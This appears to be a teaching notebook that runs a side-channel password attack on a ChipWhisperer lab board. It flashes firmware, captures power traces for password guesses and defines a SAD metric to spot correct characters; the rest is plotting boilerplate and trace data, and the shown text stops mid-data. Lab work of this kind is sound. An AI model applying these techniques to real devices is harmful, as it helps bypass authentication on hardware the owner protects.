{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lecture 2: Password Attack with Timing Analysis - Attack"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-24T09:38:09.306178Z",
     "iopub.status.busy": "2021-12-24T09:38:09.305925Z",
     "iopub.status.idle": "2021-12-24T09:38:11.136583Z",
     "shell.execute_reply": "2021-12-24T09:38:11.137171Z"
    }
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:ChipWhisperer Other:ChipWhisperer update available! See https://chipwhisperer.readthedocs.io/en/latest/installing.html for updating instructions\n"
     ]
    }
   ],
   "source": [
    "import sys\n",
    "sys.path.insert(0, '..')\n",
    "import securec\n",
    "from securec import util\n",
    "scope, target = util.init()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-24T09:38:11.143607Z",
     "iopub.status.busy": "2021-12-24T09:38:11.142910Z",
     "iopub.status.idle": "2021-12-24T09:38:11.856339Z",
     "shell.execute_reply": "2021-12-24T09:38:11.855362Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "XMEGA Programming flash...\n",
      "XMEGA Reading flash...\n",
      "Verified flash OK, 2047 bytes\n",
      "\u001b[32m✓\u001b[0m\n"
     ]
    }
   ],
   "source": [
    "securec.util.compile_and_flash('./1_password_fixed.c')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-24T09:38:11.865577Z",
     "iopub.status.busy": "2021-12-24T09:38:11.864681Z",
     "iopub.status.idle": "2021-12-24T09:38:11.908116Z",
     "shell.execute_reply": "2021-12-24T09:38:11.907623Z"
    }
   },
   "outputs": [],
   "source": [
    "import struct\n",
    "import time\n",
    "import warnings\n",
    "    \n",
    "scope.default_setup()\n",
    "scope.adc.samples = 1000\n",
    "\n",
    "def capture(attempt):\n",
    "    scope.arm()\n",
    "    target.simpleserial_write(0x01, attempt.encode() + b'\\x00' * (10 - len(attempt)))\n",
    "    result = target.simpleserial_read(0x01, 1)\n",
    "    return util.capture(), bool(result[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## The sum of absolute differences\n",
    "In this example we want to see how a technique called SAD (sum of absolute differences) is useful to auto-detect whether a character was correct or not.\n",
    "Given two traces $t_1, t_2$ their SAD value is defined as:\n",
    "$$\\text{SAD}(t_1, t_2) := \\sum_i \\big| t_1[i] - t_2[i] \\big|,$$\n",
    "where $t[i]$ is the value of trace $t$ at point $i$."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-24T09:38:11.912380Z",
     "iopub.status.busy": "2021-12-24T09:38:11.911821Z",
     "iopub.status.idle": "2021-12-24T09:38:11.913751Z",
     "shell.execute_reply": "2021-12-24T09:38:11.913569Z"
    }
   },
   "outputs": [],
   "source": [
    "def sad(trace1, trace2):\n",
    "    return sum(abs(trace1 - trace2))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Visualize SAD"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-24T09:38:11.915853Z",
     "iopub.status.busy": "2021-12-24T09:38:11.915630Z",
     "iopub.status.idle": "2021-12-24T09:38:12.145518Z",
     "shell.execute_reply": "2021-12-24T09:38:12.145310Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "    <div class=\"bk-root\">\n",
       "        <a href=\"https://bokeh.org\" target=\"_blank\" class=\"bk-logo bk-logo-small bk-logo-notebook\"></a>\n",
       "        <span id=\"1002\">Loading BokehJS ...</span>\n",
       "    </div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "\n",
       "(function(root) {\n",
       "  function now() {\n",
       "    return new Date();\n",
       "  }\n",
       "\n",
       "  const force = true;\n",
       "\n",
       "  if (typeof root._bokeh_onload_callbacks === \"undefined\" || force === true) {\n",
       "    root._bokeh_onload_callbacks = [];\n",
       "    root._bokeh_is_loading = undefined;\n",
       "  }\n",
       "\n",
       "  const JS_MIME_TYPE = 'application/javascript';\n",
       "  const HTML_MIME_TYPE = 'text/html';\n",
       "  const EXEC_MIME_TYPE = 'application/vnd.bokehjs_exec.v0+json';\n",
       "  const CLASS_NAME = 'output_bokeh rendered_html';\n",
       "\n",
       "  /**\n",
       "   * Render data to the DOM node\n",
       "   */\n",
       "  function render(props, node) {\n",
       "    const script = document.createElement(\"script\");\n",
       "    node.appendChild(script);\n",
       "  }\n",
       "\n",
       "  /**\n",
       "   * Handle when an output is cleared or removed\n",
       "   */\n",
       "  function handleClearOutput(event, handle) {\n",
       "    const cell = handle.cell;\n",
       "\n",
       "    const id = cell.output_area._bokeh_element_id;\n",
       "    const server_id = cell.output_area._bokeh_server_id;\n",
       "    // Clean up Bokeh references\n",
       "    if (id != null && id in Bokeh.index) {\n",
       "      Bokeh.index[id].model.document.clear();\n",
       "      delete Bokeh.index[id];\n",
       "    }\n",
       "\n",
       "    if (server_id !== undefined) {\n",
       "      // Clean up Bokeh references\n",
       "      const cmd_clean = \"from bokeh.io.state import curstate; print(curstate().uuid_to_server['\" + server_id + \"'].get_sessions()[0].document.roots[0]._id)\";\n",
       "      cell.notebook.kernel.execute(cmd_clean, {\n",
       "        iopub: {\n",
       "          output: function(msg) {\n",
       "            const id = msg.content.text.trim();\n",
       "            if (id in Bokeh.index) {\n",
       "              Bokeh.index[id].model.document.clear();\n",
       "              delete Bokeh.index[id];\n",
       "            }\n",
       "          }\n",
       "        }\n",
       "      });\n",
       "      // Destroy server and session\n",
       "      const cmd_destroy = \"import bokeh.io.notebook as ion; ion.destroy_server('\" + server_id + \"')\";\n",
       "      cell.notebook.kernel.execute(cmd_destroy);\n",
       "    }\n",
       "  }\n",
       "\n",
       "  /**\n",
       "   * Handle when a new output is added\n",
       "   */\n",
       "  function handleAddOutput(event, handle) {\n",
       "    const output_area = handle.output_area;\n",
       "    const output = handle.output;\n",
       "\n",
       "    // limit handleAddOutput to display_data with EXEC_MIME_TYPE content only\n",
       "    if ((output.output_type != \"display_data\") || (!Object.prototype.hasOwnProperty.call(output.data, EXEC_MIME_TYPE))) {\n",
       "      return\n",
       "    }\n",
       "\n",
       "    const toinsert = output_area.element.find(\".\" + CLASS_NAME.split(' ')[0]);\n",
       "\n",
       "    if (output.metadata[EXEC_MIME_TYPE][\"id\"] !== undefined) {\n",
       "      toinsert[toinsert.length - 1].firstChild.textContent = output.data[JS_MIME_TYPE];\n",
       "      // store reference to embed id on output_area\n",
       "      output_area._bokeh_element_id = output.metadata[EXEC_MIME_TYPE][\"id\"];\n",
       "    }\n",
       "    if (output.metadata[EXEC_MIME_TYPE][\"server_id\"] !== undefined) {\n",
       "      const bk_div = document.createElement(\"div\");\n",
       "      bk_div.innerHTML = output.data[HTML_MIME_TYPE];\n",
       "      const script_attrs = bk_div.children[0].attributes;\n",
       "      for (let i = 0; i < script_attrs.length; i++) {\n",
       "        toinsert[toinsert.length - 1].firstChild.setAttribute(script_attrs[i].name, script_attrs[i].value);\n",
       "        toinsert[toinsert.length - 1].firstChild.textContent = bk_div.children[0].textContent\n",
       "      }\n",
       "      // store reference to server id on output_area\n",
       "      output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE][\"server_id\"];\n",
       "    }\n",
       "  }\n",
       "\n",
       "  function register_renderer(events, OutputArea) {\n",
       "\n",
       "    function append_mime(data, metadata, element) {\n",
       "      // create a DOM node to render to\n",
       "      const toinsert = this.create_output_subarea(\n",
       "        metadata,\n",
       "        CLASS_NAME,\n",
       "        EXEC_MIME_TYPE\n",
       "      );\n",
       "      this.keyboard_manager.register_events(toinsert);\n",
       "      // Render to node\n",
       "      const props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};\n",
       "      render(props, toinsert[toinsert.length - 1]);\n",
       "      element.append(toinsert);\n",
       "      return toinsert\n",
       "    }\n",
       "\n",
       "    /* Handle when an output is cleared or removed */\n",
       "    events.on('clear_output.CodeCell', handleClearOutput);\n",
       "    events.on('delete.Cell', handleClearOutput);\n",
       "\n",
       "    /* Handle when a new output is added */\n",
       "    events.on('output_added.OutputArea', handleAddOutput);\n",
       "\n",
       "    /**\n",
       "     * Register the mime type and append_mime function with output_area\n",
       "     */\n",
       "    OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {\n",
       "      /* Is output safe? */\n",
       "      safe: true,\n",
       "      /* Index of renderer in `output_area.display_order` */\n",
       "      index: 0\n",
       "    });\n",
       "  }\n",
       "\n",
       "  // register the mime type if in Jupyter Notebook environment and previously unregistered\n",
       "  if (root.Jupyter !== undefined) {\n",
       "    const events = require('base/js/events');\n",
       "    const OutputArea = require('notebook/js/outputarea').OutputArea;\n",
       "\n",
       "    if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {\n",
       "      register_renderer(events, OutputArea);\n",
       "    }\n",
       "  }\n",
       "\n",
       "  \n",
       "  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n",
       "    root._bokeh_timeout = Date.now() + 5000;\n",
       "    root._bokeh_failed_load = false;\n",
       "  }\n",
       "\n",
       "  const NB_LOAD_WARNING = {'data': {'text/html':\n",
       "     \"<div style='background-color: #fdd'>\\n\"+\n",
       "     \"<p>\\n\"+\n",
       "     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n",
       "     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n",
       "     \"</p>\\n\"+\n",
       "     \"<ul>\\n\"+\n",
       "     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n",
       "     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n",
       "     \"</ul>\\n\"+\n",
       "     \"<code>\\n\"+\n",
       "     \"from bokeh.resources import INLINE\\n\"+\n",
       "     \"output_notebook(resources=INLINE)\\n\"+\n",
       "     \"</code>\\n\"+\n",
       "     \"</div>\"}};\n",
       "\n",
       "  function display_loaded() {\n",
       "    const el = document.getElementById(\"1002\");\n",
       "    if (el != null) {\n",
       "      el.textContent = \"BokehJS is loading...\";\n",
       "    }\n",
       "    if (root.Bokeh !== undefined) {\n",
       "      if (el != null) {\n",
       "        el.textContent = \"BokehJS \" + root.Bokeh.version + \" successfully loaded.\";\n",
       "      }\n",
       "    } else if (Date.now() < root._bokeh_timeout) {\n",
       "      setTimeout(display_loaded, 100)\n",
       "    }\n",
       "  }\n",
       "\n",
       "\n",
       "  function run_callbacks() {\n",
       "    try {\n",
       "      root._bokeh_onload_callbacks.forEach(function(callback) {\n",
       "        if (callback != null)\n",
       "          callback();\n",
       "      });\n",
       "    } finally {\n",
       "      delete root._bokeh_onload_callbacks\n",
       "    }\n",
       "    console.debug(\"Bokeh: all callbacks have finished\");\n",
       "  }\n",
       "\n",
       "  function load_libs(css_urls, js_urls, callback) {\n",
       "    if (css_urls == null) css_urls = [];\n",
       "    if (js_urls == null) js_urls = [];\n",
       "\n",
       "    root._bokeh_onload_callbacks.push(callback);\n",
       "    if (root._bokeh_is_loading > 0) {\n",
       "      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n",
       "      return null;\n",
       "    }\n",
       "    if (js_urls == null || js_urls.length === 0) {\n",
       "      run_callbacks();\n",
       "      return null;\n",
       "    }\n",
       "    console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n",
       "    root._bokeh_is_loading = css_urls.length + js_urls.length;\n",
       "\n",
       "    function on_load() {\n",
       "      root._bokeh_is_loading--;\n",
       "      if (root._bokeh_is_loading === 0) {\n",
       "        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n",
       "        run_callbacks()\n",
       "      }\n",
       "    }\n",
       "\n",
       "    function on_error(url) {\n",
       "      console.error(\"failed to load \" + url);\n",
       "    }\n",
       "\n",
       "    for (let i = 0; i < css_urls.length; i++) {\n",
       "      const url = css_urls[i];\n",
       "      const element = document.createElement(\"link\");\n",
       "      element.onload = on_load;\n",
       "      element.onerror = on_error.bind(null, url);\n",
       "      element.rel = \"stylesheet\";\n",
       "      element.type = \"text/css\";\n",
       "      element.href = url;\n",
       "      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n",
       "      document.body.appendChild(element);\n",
       "    }\n",
       "\n",
       "    for (let i = 0; i < js_urls.length; i++) {\n",
       "      const url = js_urls[i];\n",
       "      const element = document.createElement('script');\n",
       "      element.onload = on_load;\n",
       "      element.onerror = on_error.bind(null, url);\n",
       "      element.async = false;\n",
       "      element.src = url;\n",
       "      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n",
       "      document.head.appendChild(element);\n",
       "    }\n",
       "  };\n",
       "\n",
       "  function inject_raw_css(css) {\n",
       "    const element = document.createElement(\"style\");\n",
       "    element.appendChild(document.createTextNode(css));\n",
       "    document.body.appendChild(element);\n",
       "  }\n",
       "\n",
       "  \n",
       "  const js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-2.4.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.4.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.4.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.4.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-mathjax-2.4.1.min.js\"];\n",
       "  const css_urls = [];\n",
       "  \n",
       "\n",
       "  const inline_js = [\n",
       "    function(Bokeh) {\n",
       "      Bokeh.set_log_level(\"info\");\n",
       "    },\n",
       "    function(Bokeh) {\n",
       "    \n",
       "    \n",
       "    }\n",
       "  ];\n",
       "\n",
       "  function run_inline_js() {\n",
       "    \n",
       "    if (root.Bokeh !== undefined || force === true) {\n",
       "      \n",
       "    for (let i = 0; i < inline_js.length; i++) {\n",
       "      inline_js[i].call(root, root.Bokeh);\n",
       "    }\n",
       "    if (force === true) {\n",
       "        display_loaded();\n",
       "      }} else if (Date.now() < root._bokeh_timeout) {\n",
       "      setTimeout(run_inline_js, 100);\n",
       "    } else if (!root._bokeh_failed_load) {\n",
       "      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n",
       "      root._bokeh_failed_load = true;\n",
       "    } else if (force !== true) {\n",
       "      const cell = $(document.getElementById(\"1002\")).parents('.cell').data().cell;\n",
       "      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n",
       "    }\n",
       "\n",
       "  }\n",
       "\n",
       "  if (root._bokeh_is_loading === 0) {\n",
       "    console.debug(\"Bokeh: BokehJS loaded, going straight to plotting\");\n",
       "    run_inline_js();\n",
       "  } else {\n",
       "    load_libs(css_urls, js_urls, function() {\n",
       "      console.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n",
       "      run_inline_js();\n",
       "    });\n",
       "  }\n",
       "}(window));"
      ],
      "application/vnd.bokehjs_load.v0+json": "\n(function(root) {\n  function now() {\n    return new Date();\n  }\n\n  const force = true;\n\n  if (typeof root._bokeh_onload_callbacks === \"undefined\" || force === true) {\n    root._bokeh_onload_callbacks = [];\n    root._bokeh_is_loading = undefined;\n  }\n\n  \n\n  \n  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n    root._bokeh_timeout = Date.now() + 5000;\n    root._bokeh_failed_load = false;\n  }\n\n  const NB_LOAD_WARNING = {'data': {'text/html':\n     \"<div style='background-color: #fdd'>\\n\"+\n     \"<p>\\n\"+\n     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n     \"</p>\\n\"+\n     \"<ul>\\n\"+\n     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n     \"</ul>\\n\"+\n     \"<code>\\n\"+\n     \"from bokeh.resources import INLINE\\n\"+\n     \"output_notebook(resources=INLINE)\\n\"+\n     \"</code>\\n\"+\n     \"</div>\"}};\n\n  function display_loaded() {\n    const el = document.getElementById(\"1002\");\n    if (el != null) {\n      el.textContent = \"BokehJS is loading...\";\n    }\n    if (root.Bokeh !== undefined) {\n      if (el != null) {\n        el.textContent = \"BokehJS \" + root.Bokeh.version + \" successfully loaded.\";\n      }\n    } else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(display_loaded, 100)\n    }\n  }\n\n\n  function run_callbacks() {\n    try {\n      root._bokeh_onload_callbacks.forEach(function(callback) {\n        if (callback != null)\n          callback();\n      });\n    } finally {\n      delete root._bokeh_onload_callbacks\n    }\n    console.debug(\"Bokeh: all callbacks have finished\");\n  }\n\n  function load_libs(css_urls, js_urls, callback) {\n    if (css_urls == null) css_urls = [];\n    if (js_urls == null) js_urls = [];\n\n    root._bokeh_onload_callbacks.push(callback);\n    if (root._bokeh_is_loading > 0) {\n      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n      return null;\n    }\n    if (js_urls == null || js_urls.length === 0) {\n      run_callbacks();\n      return null;\n    }\n    console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n    root._bokeh_is_loading = css_urls.length + js_urls.length;\n\n    function on_load() {\n      root._bokeh_is_loading--;\n      if (root._bokeh_is_loading === 0) {\n        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n        run_callbacks()\n      }\n    }\n\n    function on_error(url) {\n      console.error(\"failed to load \" + url);\n    }\n\n    for (let i = 0; i < css_urls.length; i++) {\n      const url = css_urls[i];\n      const element = document.createElement(\"link\");\n      element.onload = on_load;\n      element.onerror = on_error.bind(null, url);\n      element.rel = \"stylesheet\";\n      element.type = \"text/css\";\n      element.href = url;\n      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n      document.body.appendChild(element);\n    }\n\n    for (let i = 0; i < js_urls.length; i++) {\n      const url = js_urls[i];\n      const element = document.createElement('script');\n      element.onload = on_load;\n      element.onerror = on_error.bind(null, url);\n      element.async = false;\n      element.src = url;\n      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n      document.head.appendChild(element);\n    }\n  };\n\n  function inject_raw_css(css) {\n    const element = document.createElement(\"style\");\n    element.appendChild(document.createTextNode(css));\n    document.body.appendChild(element);\n  }\n\n  \n  const js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-2.4.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.4.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.4.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.4.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-mathjax-2.4.1.min.js\"];\n  const css_urls = [];\n  \n\n  const inline_js = [\n    function(Bokeh) {\n      Bokeh.set_log_level(\"info\");\n    },\n    function(Bokeh) {\n    \n    \n    }\n  ];\n\n  function run_inline_js() {\n    \n    if (root.Bokeh !== undefined || force === true) {\n      \n    for (let i = 0; i < inline_js.length; i++) {\n      inline_js[i].call(root, root.Bokeh);\n    }\n    if (force === true) {\n        display_loaded();\n      }} else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(run_inline_js, 100);\n    } else if (!root._bokeh_failed_load) {\n      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n      root._bokeh_failed_load = true;\n    } else if (force !== true) {\n      const cell = $(document.getElementById(\"1002\")).parents('.cell').data().cell;\n      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n    }\n\n  }\n\n  if (root._bokeh_is_loading === 0) {\n    console.debug(\"Bokeh: BokehJS loaded, going straight to plotting\");\n    run_inline_js();\n  } else {\n    load_libs(css_urls, js_urls, function() {\n      console.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n      run_inline_js();\n    });\n  }\n}(window));"
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from bokeh.plotting import figure, show \n",
    "from bokeh.io import output_notebook\n",
    "from bokeh.models import CrosshairTool\n",
    "from bokeh.palettes import Category10_10\n",
    "\n",
    "output_notebook()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-24T09:38:12.148171Z",
     "iopub.status.busy": "2021-12-24T09:38:12.147943Z",
     "iopub.status.idle": "2021-12-24T09:38:12.393676Z",
     "shell.execute_reply": "2021-12-24T09:38:12.394180Z"
    }
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:ChipWhisperer Target:Unexpected start to command 3\n",
      "WARNING:ChipWhisperer Target:Invalid CRC. Expected 191 got 2\n",
      "WARNING:ChipWhisperer Target:Did not receive end of frame, got 254\n",
      "WARNING:ChipWhisperer Target:Unexpected frame byte in CWbytearray(b'00 03 65')\n",
      "ERROR:ChipWhisperer Target:Device did not ack\n"
     ]
    }
   ],
   "source": [
    "traces = [(attempt, capture(attempt)[0]) for attempt in ('', 'a', 'i')]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-24T09:38:12.431444Z",
     "iopub.status.busy": "2021-12-24T09:38:12.431140Z",
     "iopub.status.idle": "2021-12-24T09:38:12.433124Z",
     "shell.execute_reply": "2021-12-24T09:38:12.433325Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "  <div class=\"bk-root\" id=\"8f812792-b83e-4d70-9e2b-98bc77c76fe5\" data-root-id=\"1003\"></div>\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "(function(root) {\n",
       "  function embed_document(root) {\n",
       "    \n",
       "  const docs_json = {\"cdb348fc-4955-45c6-a127-3f85ff8326f7\":{\"defs\":[],\"roots\":{\"references\":[{\"attributes\":{\"below\":[{\"id\":\"1012\"}],\"center\":[{\"id\":\"1015\"},{\"id\":\"1019\"},{\"id\":\"1053\"}],\"height\":200,\"left\":[{\"id\":\"1016\"}],\"renderers\":[{\"id\":\"1040\"},{\"id\":\"1059\"}],\"title\":{\"id\":\"1042\"},\"toolbar\":{\"id\":\"1027\"},\"width\":900,\"x_range\":{\"id\":\"1004\"},\"x_scale\":{\"id\":\"1008\"},\"y_range\":{\"id\":\"1006\"},\"y_scale\":{\"id\":\"1010\"}},\"id\":\"1003\",\"subtype\":\"Figure\",\"type\":\"Plot\"},{\"attributes\":{},\"id\":\"1017\",\"type\":\"BasicTicker\"},{\"attributes\":{\"coordinates\":null,\"group\":null,\"items\":[{\"id\":\"1054\"},{\"id\":\"1074\"}]},\"id\":\"1053\",\"type\":\"Legend\"},{\"attributes\":{},\"id\":\"1045\",\"type\":\"BasicTickFormatter\"},{\"attributes\":{\"coordinates\":null,\"data_source\":{\"id\":\"1036\"},\"glyph\":{\"id\":\"1037\"},\"group\":null,\"hover_glyph\":null,\"muted_glyph\":{\"id\":\"1039\"},\"nonselection_glyph\":{\"id\":\"1038\"},\"view\":{\"id\":\"1041\"}},\"id\":\"1040\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"coordinates\":null,\"data_source\":{\"id\":\"1055\"},\"glyph\":{\"id\":\"1056\"},\"group\":null,\"hover_glyph\":null,\"muted_glyph\":{\"id\":\"1058\"},\"nonselection_glyph\":{\"id\":\"1057\"},\"view\":{\"id\":\"1060\"}},\"id\":\"1059\",\"type\":\"GlyphRenderer\"},{\"attributes\":{},\"id\":\"1034\",\"type\":\"CrosshairTool\"},{\"attributes\":{\"data\":{\"x\":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,363,364,365,366,367,368,369,370,371,372,373,374,375,376,377,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,396,397,398,399,400,401,402,403,404,405,406,407,408,409,410,411,412,413,414,415,416,417,418,419,420,421,422,423,424,425,426,427,428,429,430,431,432,433,434,435,436,437,438,439,440,441,442,443,444,445,446,447,448,449,450,451,452,453,454,455,456,457,458,459,460,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,476,477,478,479,480,481,482,483,484,485,486,487,488,489,490,491,492,493,494,495,496,497,498,499,500,501,502,503,504,505,506,507,508,509,510,511,512,513,514,515,516,517,518,519,520,521,522,523,524,525,526,527,528,529,530,531,532,533,534,535,536,537,538,539,540,541,542,543,544,545,546,547,548,549,550,551,552,553,554,555,556,557,558,559,560,561,562,563,564,565,566,567,568,569,570,571,572,573,574,575,576,577,578,579,580,581,582,583,584,585,586,587,588,589,590,591,592,593,594,595,596,597,598,599,600,601,602,603,604,605,606,607,608,609,610,611,612,613,614,615,616,617,618,619,620,621,622,623,624,625,626,627,628,629,630,631,632,633,634,635,636,637,638,639,640,641,642,643,644,645,646,647,648,649,650,651,652,653,654,655,656,657,658,659,660,661,662,663,664,665,666,667,668,669,670,671,672,673,674,675,676,677,678,679,680,681,682,683,684,685,686,687,688,689,690,691,692,693,694,695,696,697,698,699,700,701,702,703,704,705,706,707,708,709,710,711,712,713,714,715,716,717,718,719,720,721,722,723,724,725,726,727,728,729,730,731,732,733,734,735,736,737,738,739,740,741,742,743,744,745,746,747,748,749,750,751,752,753,754,755,756,757,758,759,760,761,762,763,764,765,766,767,768,769,770,771,772,773,774,775,776,777,778,779,780,781,782,783,784,785,786,787,788,789,790,791,792,793,794,795,796,797,798,799,800,801,802,803,804,805,806,807,808,809,810,811,812,813,814,815,816,817,818,819,820,821,822,823,824,825,826,827,828,829,830,831,832,833,834,835,836,837,838,839,840,841,842,843,844,845,846,847,848,849,850,851,852,853,854,855,856,857,858,859,860,861,862,863,864,865,866,867,868,869,870,871,872,873,874,875,876,877,878,879,880,881,882,883,884,885,886,887,888,889,890,891,892,893,894,895,896,897,898,899,900,901,902,903,904,905,906,907,908,909,910,911,912,913,914,915,916,917,918,919,920,921,922,923,924,925,926,927,928,929,930,931,932,933,934,935,936,937,938,939,940,941,942,943,944,945,946,947,948,949,950,951,952,953,954,955,956,957,958,959,960,961,962,963,964,965,966,967,968,969,970,971,972,973,974,975,976,977,978,979,980,981,982,983,984,985,986,987,988,989,990,991,992,993,994,995,996,997,998,999],\"y\":{\"__ndarray__\":\"AAAAAAAAYD8AAAAAAABoPwAAAAAAAHQ/AAAAAAAAYD8AAAAAAABwPwAAAAAAAHg/AAAAAAAAij8AAAAAAACAPwAAAAAAAGg/AAAAAAAAeD8AAAAAAAB8PwAAAAAAAFA/AAAAAAAAYD8AAAAAAABoPwAAAAAAAAAAAAAAAAAAUD8AAAAAAAB4PwAAAAAAAHw/AAAAAAAAaD8AAAAAAABQPwAAAAAAAGA/AAAAAAAAcD8AAAAAAABgPwAAAAAAAHA/AAAAAAAAdD8AAAAAAABoPwAAAAAAAFA/AAAAAAAAYD8AAAAAAAAAAAAAAAAAAHw/AAAAAAAAgj8AAAAAAACEPwAAAAAAAIQ/AAAAAAAAgj8AAAAAAABwPwAAAAAAAHA/AAAAAAAAUD8AAAAAAACQPwAAAAAAAJg/AAAAAAAAkT8AAAAAAACCPwAAAAAAAKA/AAAAAAAAnj8AAAAAAACYPwAAAAAAAJI/AAAAAAAAkj8AAAAAAACEPwAAAAAAAHA/AAAAAAAAaD8AAAAAAACWPwAAAAAAAJU/AAAAAAAAlz8AAAAAAACOPwAAAAAAAII/AAAAAAAAlD8AAAAAAACWPwAAAAAAAJQ/AAAAAADAsT8AAAAAAICyPwAAAAAAAK0/AAAAAAAAqT8AAAAAAACKPwAAAAAAAJg/AAAAAACAoT8AAAAAAACkPwAAAAAAAIg/AAAAAAAAUD8AAAAAAABgPwAAAAAAAAAAAAAAAAAAsD8AAAAAAICvPwAAAAAAgK4/AAAAAAAAqz8AAAAAAACOPwAAAAAAAFA/AAAAAAAAeD8AAAAAAAAAAAAAAAAAAM8/AAAAAACgxz8AAAAAACDBPwAAAAAAgLY/AAAAAACAtD8AAAAAAICzPwAAAAAAALI/AAAAAAAAsD8AAAAAAAC9PwAAAAAAgLo/AAAAAADAsT8AAAAAAICsPwAAAAAA4MQ/AAAAAABgwD8AAAAA